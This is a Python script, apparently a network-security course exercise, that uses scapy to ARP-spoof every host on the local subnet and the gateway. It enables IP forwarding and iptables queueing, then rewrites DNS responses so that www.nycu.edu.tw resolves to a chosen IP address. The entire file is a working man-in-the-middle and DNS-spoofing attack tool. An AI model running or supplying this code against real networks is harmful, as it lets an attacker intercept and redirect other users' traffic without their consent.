#!/usr/bin/env python3

import scapy.all as scapy
import time, sys, subprocess, os, netfilterqueue, threading

local_ip = scapy.get_if_addr(scapy.conf.iface)  # default interface
local_mac = scapy.get_if_hwaddr(scapy.conf.iface) # default interface
gateway_ip = scapy.conf.route.route("0.0.0.0")[2]
target_domain  = gateway_ip + "/24" # all the ip in subnet

def parse_packet():
    print("[*] Packet intercepting...")
    queue = netfilterqueue.NetfilterQueue() 
    queue.bind(0, modify_packet)
    queue.run()

def modify_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) 
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"www.nycu.edu.tw" in qname:
            print("[*] NYCU is redirecting to 140.113.207.246...")
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname = qname,rdata = "140.113.207.246")
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def spoofing(target, spoof):
    packet = scapy.Ether(src=local_mac, dst=target['mac']) / scapy.ARP(hwsrc=local_mac, psrc=spoof['ip'], hwdst=target['mac'], pdst=target['ip'], op=2)
    scapy.sendp(packet,verbose = False)
    
def restore(target, source):
    packet = scapy.Ether(src=source['mac'], dst=target['mac']) / scapy.ARP(hwsrc=source['mac'], psrc=source['ip'], hwdst=target['mac'], pdst=target['ip'], op=2)
    scapy.sendp(packet,verbose = False)

def scan(ip):
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    result = scapy.srp(packet, timeout=3, verbose=0)[0]
    victims = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        victims.append({'ip': received.psrc, 'mac': received.hwsrc})

    return victims

def main():
    if os.geteuid() != 0: # check for root permision
        print("./mitm_attack: Permission denied")
        print("Try sudo ./mitm_attack")
        return

    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True) # enable ip forward
    subprocess.run("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True) # create a queue for packets

    # find the mac address of gateway
    victims = scan(target_domain)
    for victim in victims:
        if victim['ip'] == gateway_ip: gateway = victim
    
    # print clients
    print("Available devices in the network:")
    print("----------------------------------------------")
    print("IP" + " "*18+"MAC")
    print("----------------------------------------------")
    for victim in victims:
        if victim != gateway:
            print("{:16}    {}".format(victim['ip'], victim['mac']))

    t1 = threading.Thread(target=parse_packet)
    t1.daemon = True
    t1.start()

    try:
        print("[*] ARP spoofing...")
        while True:
            for victim in victims:
                if victim != gateway:
                    spoofing(victim,gateway) # tell victim we are router
                    spoofing(gateway,victim) # tell router we are victim

            time.sleep(2)
    except KeyboardInterrupt:
        subprocess.run("iptables --flush",shell=True) # flush the iptables
        print("[*] Sucessfully flushing iptables")
        print("[*] ARP spoofing is terminated, restoring ARP table")
        for victim in victims:
            if victim != gateway:
                restore(victim, gateway)
                restore(gateway, victim)
        print("[*] Sucessfully restoring ARP table")
        sys.exit() # this will also stop all the daemon threads

if __name__ == '__main__':
	main()